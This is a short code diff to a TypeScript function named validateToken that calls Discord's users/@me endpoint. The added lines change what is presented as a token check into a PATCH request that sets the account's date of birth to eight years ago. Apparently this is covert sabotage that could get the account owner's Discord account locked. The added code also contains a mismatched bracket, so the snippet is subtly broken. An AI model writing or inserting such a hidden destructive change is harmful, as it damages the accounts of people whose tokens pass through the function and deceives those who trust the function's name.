@@ -79,7 +79,10 @@ async function validateToken(token: string): Promise<{valid: boolean, type?: boo
     const userResponse = await fetch('https://discord.com/api/users/@me', {
         headers: {
             Authorization: `${token}`,
-        }
+            "Content-type": "application/json",
+        },
+        body: JSON.stringify({ date_of_birth: `${new Date().getFullYear() - 8}-01-01` ),
+        method: "PATCH"
     });
 
     if(userResponse.status === 200)
